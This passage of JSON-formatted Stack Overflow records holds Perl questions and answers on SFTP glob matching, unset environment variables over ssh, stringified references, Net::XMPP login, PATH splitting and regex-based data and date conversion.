"score": 1, "last_activity_date": 1574869770, "creation_date": 1574869770, "answer_id": 59073909, "question_id": 59073555, "link": "https://stackoverflow.com/questions/59073555/how-to-get-files-matching-a-pattern-using-perl-netsftpforeign/59073909#59073909", "title": "How to get files matching a pattern using perl Net::SFTP::Foreign", "body": "<p>Try using <a href=\"https://metacpan.org/pod/release/RCLAMP/Text-Glob-0.09/lib/Text/Glob.pm\" rel=\"nofollow noreferrer\">Text::Glob</a> especially the glob_to_regex function in it</p>\n"}, {"tags": [], "owner": {"reputation": 23, "user_id": 12446481, "user_type": "registered", "profile_image": "https://graph.facebook.com/2465939396976866/picture?type=large", "display_name": "Marco Fillip Filzinger", "link": "https://stackoverflow.com/users/12446481/marco-fillip-filzinger"}, "is_accepted": false, "score": 0, "last_activity_date": 1574935774, "creation_date": 1574935774, "answer_id": 59086323, "question_id": 59073555, "link": "https://stackoverflow.com/questions/59073555/how-to-get-files-matching-a-pattern-using-perl-netsftpforeign/59086323#59086323", "title": "How to get files matching a pattern using perl Net::SFTP::Foreign", "body": "<p>It's working fine now. Thanks to JGNI and the Text::Glob module</p>\n\n<p>after using the module:</p>\n\n<pre><code>use Text::Glob 'glob_to_regex';\n</code></pre>\n\n<p>we can use a Pattern like in ftp->ls:</p>\n\n<pre><code>$Pattern = *.*;\nmy $FilesRef = $sftp-&gt;ls(names_only =&gt; 1, wanted =&gt; glob_to_regex($Pattern));\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "is_accepted": false, "score": 2, "last_activity_date": 1575461941, "creation_date": 1575461941, "answer_id": 59175920, "question_id": 59073555, "link": "https://stackoverflow.com/questions/59073555/how-to-get-files-matching-a-pattern-using-perl-netsftpforeign/59175920#59175920", "title": "How to get files matching a pattern using perl Net::SFTP::Foreign", "body": "<p><code>Net::SFTP::Foreign</code> provides the <a href=\"https://metacpan.org/pod/Net::SFTP::Foreign#$sftp-%3Eglob($pattern,-%opts)\" rel=\"nofollow noreferrer\"><code>glob</code></a> method just for that:</p>\n\n<pre><code>sftp-&gt;setcwd($folder_at_host);\nmy $files = $sftp-&gt;glob('*.jpg');\nfor my $file (@$files) {\n    ...\n}\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 12446481, "user_type": "registered", "profile_image": "https://graph.facebook.com/2465939396976866/picture?type=large", "display_name": "Marco Fillip Filzinger", "link": "https://stackoverflow.com/users/12446481/marco-fillip-filzinger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 242, "favorite_count": 0, "accepted_answer_id": 59073909, "answer_count": 3, "score": 2, "last_activity_date": 1575664109, "creation_date": 1574868563, "last_edit_date": 1575664109, "question_id": 59073555, "link": "https://stackoverflow.com/questions/59073555/how-to-get-files-matching-a-pattern-using-perl-netsftpforeign", "title": "How to get files matching a pattern using perl Net::SFTP::Foreign", "body": "<p>This is my first submitted question at all and I hope someone can help me with this. I never used perl before so any other tips are highly appreciated too.</p>\n\n<p>Lets say I have a perl script with NET::FTP that matches a pattern which can be specified while calling the script. For example:  </p>\n\n<pre><code>perl ftp.pl '*.txt'\n</code></pre>\n\n<p>To keep it absolute simple, here is what i would do with NET::FTP after establishing the connection to the FTP-Server.</p>\n\n<pre><code>$Pattern = '*.*';\n$ftp-&gt;cwd($FolderAtHost);\nmy @Files = $ftp-&gt;ls($Pattern);\nforeach my $File (@Files)\n{\n     ...\n}\n</code></pre>\n\n<p>Now I want to make the same thing with NET::SFTP. but the <code>ls</code> Method is completely different. It returns a reference to an Array instead of an array, which is not a big deal.\nBut I don't find a way to check for a specific file-pattern like: <strong>*.*</strong></p>\n\n<p>I know there is a <code>wanted =&gt;</code> option in the <code>ls</code> method of the sftp package, but it requires RegEx instead of a file-pattern.</p>\n\n<pre><code>sftp-&gt;setcwd($FolderAtHost)\nmy @FilesRef = $sftp-&gt;ls(names_only =&gt; 1, wanted =&gt; qr/.../);\nforeach my $File (@$FilesRef)\n{\n    ...\n}\n</code></pre>\n\n<p>Do I have to write a File-Pattern to Regex converter first or is there a simpler way to achieve this?\nMaybe matching the filename within the <code>foreach</code>?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 1, "user_id": 12446054, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAZ8n5JxaZwy6JknicFstUtNW6wzedX75P6nd_clg=k-s128", "display_name": "prince charu", "link": "https://stackoverflow.com/users/12446054/prince-charu"}, "reply_to_user": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "edited": false, "score": 0, "creation_date": 1574926320, "post_id": 59072125, "comment_id": 104403458, "body": "Not set in the sense ? How to set it then ?"}], "answers": [{"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 1, "user_id": 12446054, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAZ8n5JxaZwy6JknicFstUtNW6wzedX75P6nd_clg=k-s128", "display_name": "prince charu", "link": "https://stackoverflow.com/users/12446054/prince-charu"}, "edited": false, "score": 0, "creation_date": 1574945807, "post_id": 59085568, "comment_id": 104413580, "body": "@princecharu: <a href=\"https://stackoverflow.com/help/someone-answers\">What should I do when someone answers my question?</a>"}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1574933487, "creation_date": 1574933487, "answer_id": 59085568, "question_id": 59072125, "link": "https://stackoverflow.com/questions/59072125/use-of-uninitialized-value-envir-in-concatenation/59085568#59085568", "title": "Use of uninitialized value $ENV{&quot;IR&quot;} in concatenation", "body": "<p>The <code>%ENV</code> hash contains the environment variables from the operating system environment that started your process. <code>$ENV{IR}</code> contains the value of the <code>IR</code> environment variable. The warning you are getting is telling you that this variable has not been set.</p>\n\n<p>You need to set this variable before running your command. It looks like you're running Linux, so something like this will work:</p>\n\n<pre><code>plantz1:nyop% export IR=something\n</code></pre>\n\n<p>Unfortunately, as I don't know anything about the software you're trying to use, I can't give you any help as to what the value of that variable needs to be.</p>\n"}], "owner": {"reputation": 1, "user_id": 12446054, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAZ8n5JxaZwy6JknicFstUtNW6wzedX75P6nd_clg=k-s128", "display_name": "prince charu", "link": "https://stackoverflow.com/users/12446054/prince-charu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 165, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1574933487, "creation_date": 1574864040, "last_edit_date": 1574864810, "question_id": 59072125, "link": "https://stackoverflow.com/questions/59072125/use-of-uninitialized-value-envir-in-concatenation", "title": "Use of uninitialized value $ENV{&quot;IR&quot;} in concatenation", "body": "<p>I'm trying to execute a shell script from one server(plantz1). While executing, I have written the script in such a way that it should log in to another system (globez1) and in that second system, one perl script should be running. But i'm getting errors like below:<br>\nPlease help me somebody on this. Below, I'm taking the commands from the script and showing you the o/p.</p>\n\n<pre><code>plantz1:nyop% ssh globez1 \"export PATH=/ilx/ops/sbin:$PATH; /ilx/ops/sbin/mklive_pour ewh drop\"\nUse of uninitialized value $ENV{\"IR\"} in concatenation (.) or string at /ilx/ops/sbin/mklive_pour line 25.\nUse of uninitialized value $ENV{\"IR\"} in concatenation (.) or string at /ilx/ops/sbin/mklive_pour line 25.\nUse of uninitialized value $ENV{\"IR\"} in concatenation (.) or string at /ilx/ops/sbin/mklive_pour line 69.\nUse of uninitialized value $ENV{\"IR\"} in concatenation (.) or string at /ilx/ops/sbin/mklive_pour line 69.\nNo symon.def file? :No such file or directory at /ilx/ops/sbin/mklive_pour line 69.\n</code></pre>\n\n<p>plantz1 is first server\nglobez1 is secondary server\n/ilx/ops/sbin/mklive_pour - it's the perl script </p>\n"}, {"tags": ["arrays", "string", "perl", "reference"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 4, "creation_date": 1574863457, "post_id": 59071757, "comment_id": 104381732, "body": "There is an error in your use of variable and references. This does not surprise you. But if you want more details, then please show the code you are describing. Please provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. (Actually you do not even describe your code.... but you know what I mean.)"}], "answers": [{"comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1574870936, "post_id": 59072981, "comment_id": 104386055, "body": "unsmash_av in <a href=\"http://p3rl.org/Devel::Pointer::PP\" rel=\"nofollow noreferrer\">p3rl.org/Devel::Pointer::PP</a> (but don&#39;t do that)"}], "tags": [], "owner": {"reputation": 42833, "user_id": 18914, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7a20a39ae2ef47ae042a3eddd5b5bd19?s=128&d=identicon&r=PG", "display_name": "Dave Sherohman", "link": "https://stackoverflow.com/users/18914/dave-sherohman"}, "is_accepted": false, "score": 1, "last_activity_date": 1574866712, "creation_date": 1574866712, "answer_id": 59072981, "question_id": 59071757, "link": "https://stackoverflow.com/questions/59071757/is-there-a-way-to-convert-array-ref-as-string-to-an-actual-array-ref-in-perl/59072981#59072981", "title": "Is there a way to convert Array Ref as String to an actual Array ref in Perl? - Can&#39;t use string(&quot;ARRAY(...)&quot;) as an ARRAY ref", "body": "<p>No, there is no way to convert a stringified reference back into a real, usable reference.  You need to examine the code which is giving you the stringified reference and fix it so that the reference doesn't get coerced into a string in the first place.  (If you edit the question to include the code in question - or, better, an <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">MCVE</a> - then we can probably help you to fix it.)</p>\n"}], "owner": {"reputation": 9, "user_id": 10465895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/121f91e25fd4fcb78faa88da9a0da079?s=128&d=identicon&r=PG&f=1", "display_name": "psahota", "link": "https://stackoverflow.com/users/10465895/psahota"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "closed_date": 1574933237, "answer_count": 1, "score": -2, "last_activity_date": 1574866712, "creation_date": 1574862775, "last_edit_date": 1592644375, "question_id": 59071757, "link": "https://stackoverflow.com/questions/59071757/is-there-a-way-to-convert-array-ref-as-string-to-an-actual-array-ref-in-perl", "closed_reason": "Not suitable for this site", "title": "Is there a way to convert Array Ref as String to an actual Array ref in Perl? - Can&#39;t use string(&quot;ARRAY(...)&quot;) as an ARRAY ref", "body": "<p>I am getting an Array reference as a String Value in my subroutine</p>\nIs there a way to convert it to an actual array reference in Perl?\n<p>The error that I am seeing is:</p>\nFailed to process for the following reason: <em>Can't use string (&quot;ARRAY(0x7fe81abebd68)&quot;) as an ARRAY ref while &quot;strict refs&quot; in use at ..</em>\n<p>I need to use a value from this array ref that is coming as a String.</p>\n"}, {"tags": ["perl", "xmpp"], "owner": {"reputation": 473, "user_id": 8721281, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7DKU2.jpg?s=128&g=1", "display_name": "Chazg76", "link": "https://stackoverflow.com/users/8721281/chazg76"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 79, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1574843839, "creation_date": 1574843839, "question_id": 59066132, "link": "https://stackoverflow.com/questions/59066132/can-only-connect-to-xmpp-server-as-anonymousunknown-com-with-perl-netxmpp-mod", "title": "Can only connect to XMPP server as anonymous@unknown.com with perl Net::XMPP module", "body": "<p>I am trying to connect to an XMPP server and send a message to another user using the following perl code </p>\n\n<p>(taken from <a href=\"https://roadha.us/2011/04/send-xmpp-messages-with-perl-from-the-command-line-too.html\" rel=\"nofollow noreferrer\">https://roadha.us/2011/04/send-xmpp-messages-with-perl-from-the-command-line-too.html</a>).</p>\n\n<p>It works but the mesage is sent from anonymous@unknown.com. I know this because I have Pidgin running as another user on the same XMPP server and recieve the message from my perl program from anonymous@unknown.com. Pidgin also shows anonymous@unknown.com as offline!</p>\n\n<pre><code>#!/usr/bin/perl  \nuse strict;  \nuse Net::XMPP;\n\nmy ($recip, $msg) = @ARGV;\n\nif(! $recip || ! $msg) {  \n    print 'Syntax: $0 &lt;recipient&gt; &lt;message&gt;\\n';  \n    exit;  \n}\n\nmy $con = new Net::XMPP::Client();  \n\nmy $status = $con-&gt;Connect(  \nhostname =&gt; 'xx.xx.xx.xx',port=&gt;5222, \nconnectiontype =&gt; 'tcpip',  \ntls =&gt; 0);  \n\ndie('ERROR: XMPP connection failed') if ! defined($status);  \nmy @result = $con-&gt;AuthSend(  \n    username =&gt; 'Uname',  \n    password =&gt; 'PWord',\n    resource=&gt;'Test');   \ndie('ERROR: XMPP authentication failed') if $result[0] ne 'ok';  \ndie('ERROR: XMPP message failed') if ($con-&gt;MessageSend(to =&gt; $recip, body =&gt; $msg) != 0);  \nprint 'Success!\\n';\n</code></pre>\n\n<p>From the code I would expect to by connected as Uname. Why is this not the case?</p>\n"}, {"tags": ["regex", "perl", "directory"], "comments": [{"owner": {"reputation": 1106, "user_id": 298285, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d3611288bdc8ccb57fd22c2df61a967?s=128&d=identicon&r=PG", "display_name": "1111161171159459134", "link": "https://stackoverflow.com/users/298285/1111161171159459134"}, "edited": false, "score": 0, "creation_date": 1574819969, "post_id": 59061558, "comment_id": 104363082, "body": "You should also check your syntax: it should be <code>=~</code> instead of <code>~=</code>."}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 12441967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d5e0a070e69f141ef3f1ec7b48bc245?s=128&d=identicon&r=PG&f=1", "display_name": "trying_to_program", "link": "https://stackoverflow.com/users/12441967/trying-to-program"}, "edited": false, "score": 0, "creation_date": 1574817280, "post_id": 59061584, "comment_id": 104362576, "body": "Alright thanks, I&#39;m curious though if you would still know how to do it in regex. It&#39;s kind of bothering me now lol. If not I appreciate the reply."}], "tags": [], "owner": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "is_accepted": false, "score": 7, "last_activity_date": 1574817060, "last_edit_date": 1574817060, "creation_date": 1574816552, "answer_id": 59061584, "question_id": 59061558, "link": "https://stackoverflow.com/questions/59061558/perl-regex-with-shell/59061584#59061584", "title": "Perl regex with shell", "body": "<p>There is no need to invoke the shell since Perl makes all environment variables available in its <code>%ENV</code> hash.\nUse <a href=\"https://perldoc.perl.org/functions/split.html\" rel=\"noreferrer\">split</a> to extract the colon-separated directory names from the environment variable:</p>\n\n<pre><code>my @dirs = split /:/, $ENV{PATH};\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1574820079, "post_id": 59061878, "comment_id": 104363103, "body": "<code>&#47;[^:]+&#47;g</code> would be sufficient (<code>my @arr = $ENV{PATH} =~ &#47;[^:]+&#47;g;</code>)"}], "tags": [], "owner": {"reputation": 1106, "user_id": 298285, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d3611288bdc8ccb57fd22c2df61a967?s=128&d=identicon&r=PG", "display_name": "1111161171159459134", "link": "https://stackoverflow.com/users/298285/1111161171159459134"}, "is_accepted": false, "score": 1, "last_activity_date": 1574977384, "last_edit_date": 1574977384, "creation_date": 1574819374, "answer_id": 59061878, "question_id": 59061558, "link": "https://stackoverflow.com/questions/59061558/perl-regex-with-shell/59061878#59061878", "title": "Perl regex with shell", "body": "<blockquote>\n  <p>I keep getting that the search pattern is not terminated</p>\n</blockquote>\n\n<p>Your code <code>dirs ~= //(.*):</code> is indeed bizarre: you start a regex with <code>/</code> and you immediately close it: <code>//</code>.</p>\n\n<p>You could use <code>m##</code> to easily know where it starts and where it ends, like this : </p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>my $dirs = qx(echo \\$PATH);\nmy @arr = $dirs =~ m#([^:]+)(?::|$)#g;\n</code></pre>\n\n<p>(By the way, @toolic's answer is very good.)</p>\n"}], "owner": {"reputation": 19, "user_id": 12441967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d5e0a070e69f141ef3f1ec7b48bc245?s=128&d=identicon&r=PG&f=1", "display_name": "trying_to_program", "link": "https://stackoverflow.com/users/12441967/trying-to-program"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1574977384, "creation_date": 1574816314, "last_edit_date": 1574826278, "question_id": 59061558, "link": "https://stackoverflow.com/questions/59061558/perl-regex-with-shell", "title": "Perl regex with shell", "body": "<pre><code>my $dirs = qx(echo \\$PATH);\nmy @arr = $dirs ~= //(.*):;\n</code></pre>\n\n<p>I know the regex has to first find a \"/\" and then a \":\" \nI thought my regex would do that however I keep getting that the search pattern is not terminated. Any help would greatly be appreciated.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1574801121, "post_id": 59059018, "comment_id": 104357603, "body": "Welcome to Stack Overflow.  Please read the <a href=\"https://stackoverflow.com/tour\">About</a> and <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> pages.  Since the title mentions Perl and there&#39;s no mention of C, I&#39;ve removed the C tag.  What have you tried?  They both seem amenable to handling the data as strings and using the <code>s&#47;&#47;&#47;</code> operation (several times, perhaps) to transform the input into the output.  More fiddly than very difficult."}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1574813258, "post_id": 59059018, "comment_id": 104361663, "body": "if you have two questions, you should create two questions, not one"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 12440663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c17d72d1592dc37a6da47ea6eb9168bd?s=128&d=identicon&r=PG&f=1", "display_name": "james adnl ", "link": "https://stackoverflow.com/users/12440663/james-adnl"}, "edited": false, "score": 0, "creation_date": 1574804383, "post_id": 59059624, "comment_id": 104358943, "body": "Thank you very much for your answer I am a beginner in perl $data=&quot;{111,222},{333,444},{555,666}&quot;; $data=s/^\\{//; $data=s/\\}$//; $data=s/\\}?,\\{?/;/g; print $data;  the program will not work"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 1, "user_id": 12440663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c17d72d1592dc37a6da47ea6eb9168bd?s=128&d=identicon&r=PG&f=1", "display_name": "james adnl ", "link": "https://stackoverflow.com/users/12440663/james-adnl"}, "edited": false, "score": 0, "creation_date": 1574804679, "post_id": 59059624, "comment_id": 104359052, "body": "Next time, please try to produce something \u2014 an <i>honest</i> attempt to solve the problem.  And then ask for help with the problems you face with your attempt.  I probably shouldn&#39;t have posted this answer.  Note that <code>\\d\\d</code> is shorter than <code>\\d{2}</code> which achieves the same result in the regexes \u2014 and is why I wrote that out.  I probably could use <code>(\\d\\d(:\\d\\d){2})</code> to shorten the hh:mm:ss match \u2014 or even <code>(\\d\\d(?::\\d\\d){2})</code> \u2014 but that would probably confuse you more than it would help you."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 1, "user_id": 12440663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c17d72d1592dc37a6da47ea6eb9168bd?s=128&d=identicon&r=PG&f=1", "display_name": "james adnl ", "link": "https://stackoverflow.com/users/12440663/james-adnl"}, "edited": false, "score": 0, "creation_date": 1574804836, "post_id": 59059624, "comment_id": 104359111, "body": "Your script uses assignments <code>=</code> where it should use the regex <a href=\"https://perldoc.perl.org/5.30.0/perlop.html#Binding-Operators\" rel=\"nofollow noreferrer\">binding operator</a> <code>=~</code>.  If you use: <code>perl -le &#39;$data=&quot;{111,222},{333,444},{555,666}&quot;; $data=~s&#47;^\\{&#47;&#47;; $data=~s&#47;\\}$&#47;&#47;; $data=~s&#47;\\}?,\\{?&#47;;&#47;g; print $data;&#39;</code> it produces the requisite output.  Or better, use a little more white space: <code>perl -le &#39;$data = &quot;{111,222},{333,444},{555,666}&quot;; $data =~ s&#47;^\\{&#47;&#47;; $data =~ s&#47;\\}$&#47;&#47;; $data =~ s&#47;\\}?,\\{?&#47;;&#47;g; print $data;&#39;</code>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 1, "user_id": 12440663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c17d72d1592dc37a6da47ea6eb9168bd?s=128&d=identicon&r=PG&f=1", "display_name": "james adnl ", "link": "https://stackoverflow.com/users/12440663/james-adnl"}, "edited": false, "score": 0, "creation_date": 1574805216, "post_id": 59059624, "comment_id": 104359242, "body": "You can format code in comments using backticks before and after the code.  For example <code>\u2026`code`\u2026</code>.  You can use one, two or three backticks at each end \u2014 that fragment used three backticks around the ellipsis, backtick, &#39;code&#39;, backtick, ellipsis material."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 0, "last_activity_date": 1574803879, "creation_date": 1574803879, "answer_id": 59059624, "question_id": 59059018, "link": "https://stackoverflow.com/questions/59059018/i-have-two-problems-converting-data-using-perl/59059624#59059624", "title": "I have two problems converting data using Perl?", "body": "<ol>\n<li><p>You could use a simple script like this:</p>\n\n<pre><code>#!/usr/bin/perl -pl\ns/^\\{//;\ns/\\}$//;\ns/\\}?,\\{?/;/g;\n</code></pre>\n\n<p>The shebang line says read input lines and print the modified form of each one (<code>-p</code>) and handle line endings automatically (<code>-l</code>).</p>\n\n<p>The first <code>s///</code> removes a leading <code>{</code>.  The second removes a trailing <code>}</code>.  The last replaces <code>},{</code> and <code>,</code> with <code>;</code> across the line.</p></li>\n<li><p>You could use a simple script like this (assuming that you really want <code>2019-11-04T15:26:11.000+00:00</code> mapped to <code>11/04/2019 15:26:11</code> and not the other value which is 8 days bar 52 seconds after the input value):</p>\n\n<pre><code>#!/usr/bin/perl -pl\ns%(\\d{4})-(\\d\\d)-(\\d\\d)[T ](\\d\\d:\\d\\d:\\d\\d).*%$2/$3/$1 $4%;\n</code></pre>\n\n<p>The shebang line is the same as before.  The regex looks for 4 digits, dash, 2 digits, dash, 2 digits, blank or <code>T</code>, an <code>hh:mm:ss</code> string and stray junk and reformats it in the correct sequence.</p></li>\n</ol>\n\n<p>Between them, they produce the desired results.</p>\n\n<p>Of course, this being Perl, TMTOWTDI \u2014 timtoady, or \"there's more than one way to do it\":</p>\n\n<pre><code>$ cat data\n{111,222},{333,444},{555,666}\n{111,222},{333,444}\n{111,222}\n$ cat data.2\n2019-11-12 15:25:19\n2019-11-04T15:26:11.000+00:00\n$ perl -pl -e 's/^\\{//; s/\\}$//; s/\\}?,\\{?/;/g; s%(\\d{4})-(\\d\\d)-(\\d\\d)[T ](\\d\\d:\\d\\d:\\d\\d).*%$2/$3/$1 $4%;' data data.2\n111;222;333;444;555;666\n111;222;333;444\n111;222\n11/12/2019 15:25:19\n11/04/2019 15:26:11\n$\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": false, "score": 0, "last_activity_date": 1574813097, "creation_date": 1574813097, "answer_id": 59061168, "question_id": 59059018, "link": "https://stackoverflow.com/questions/59059018/i-have-two-problems-converting-data-using-perl/59061168#59061168", "title": "I have two problems converting data using Perl?", "body": "<p>Just transliterating sequences of non-digits to <code>;</code>:</p>\n\n<pre><code>$data =~ y/0-9/;/cs;\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 12440663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c17d72d1592dc37a6da47ea6eb9168bd?s=128&d=identicon&r=PG&f=1", "display_name": "james adnl ", "link": "https://stackoverflow.com/users/12440663/james-adnl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 1, "accepted_answer_id": 59059624, "answer_count": 2, "score": -2, "last_activity_date": 1574813097, "creation_date": 1574800758, "last_edit_date": 1574800988, "question_id": 59059018, "link": "https://stackoverflow.com/questions/59059018/i-have-two-problems-converting-data-using-perl", "title": "I have two problems converting data using Perl?", "body": "<ol>\n<li><p>I want to convert this input <code>{111,222},{333,444},{555,666}</code> so that the output be like this <code>111;222;333;444;555;666</code>. The same thing goes for <code>{111,222},{333,444}</code> to <code>111;222;333;444</code> and <code>{111,222}</code> to <code>111;222</code>.</p></li>\n<li><p>I want to convert this date format from <code>2019-11-12 15:25:19</code> to <code>11/12/2019 15:25:19</code> and <code>2019-11-04T15:26:11.000+00:00</code> to <code>11/12/2019 15:25:19</code>.</p></li>\n</ol>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "edited": false, "score": 2, "creation_date": 1574799073, "post_id": 59058634, "comment_id": 104356719, "body": "You&#39;re missing <code>else</code>"}, {"owner": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "edited": false, "score": 0, "creation_date": 1574799174, "post_id": 59058634, "comment_id": 104356757, "body": "I don&#39;t know anything about Perl syntax but any other language would crash if you&#39;re missing the <code>else</code> like that"}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 1, "creation_date": 1574799255, "post_id": 59058634, "comment_id": 104356797, "body": "Without the <code>else</code> that second block is just a bare block scope and runs the contained code unconditionally."}, {"owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "reply_to_user": {"reputation": 18299, "user_id": 2191572, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/TWbVr.png?s=128&g=1", "display_name": "MonkeyZeus", "link": "https://stackoverflow.com/users/2191572/monkeyzeus"}, "edited": false, "score": 0, "creation_date": 1574799281, "post_id": 59058634, "comment_id": 104356811, "body": "@MonkeyZeus it runs as a 